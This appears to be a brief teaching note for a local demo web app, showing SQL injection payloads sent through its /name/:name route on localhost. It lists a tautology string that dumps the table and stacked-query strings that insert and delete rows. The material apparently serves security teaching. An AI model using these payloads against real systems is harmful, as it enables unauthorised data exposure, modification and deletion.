/names just returns all names. Not really relevant here as no data is passed in
/name/:name pass something like /name/martin and bon martin's details return

Demo SQL injection
localhost:3000/name/`' OR 1=1;  -- `   This will dump the whole table and expose all field names

If the server enables multiple queries
localhost:3000/name/`'; SELECT * FROM names; -- `  Will return the same thing but we know we can use two queries

Now we know the table structure, we could drop the table or modify it. E.g. change an amount or add a whole new user
localhost:3000/name/`'; INSERT INTO names (first_name, last_name, age) VALUES ('tony', 'nicol', 25);  -- `

Delete a user
localhost:3000/name/`'; DELETE FROM `basic`.`names` WHERE (`last_name` = 'nicol');  -- `